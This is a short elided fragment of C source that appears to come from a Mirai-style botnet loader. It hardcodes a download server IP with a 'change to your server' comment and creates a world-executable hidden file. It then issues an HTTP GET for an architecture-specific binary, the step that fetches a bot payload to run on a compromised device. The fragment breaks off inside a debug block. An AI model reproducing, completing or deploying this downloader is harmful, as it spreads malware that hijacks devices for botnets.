...
#define HTTP_SERVER utils_inet_addr(34.142.37.184) // CHANGE TO YOUR HTTP SERVER IP

#define EXEC_MSG            "KTN1\n"
...
inline void run(void)
{
    ...
    ffd = open(".c5t5n5-555", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /Please-Subscribe-To-My-YT-Channel-VegaSec/1isequal9." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
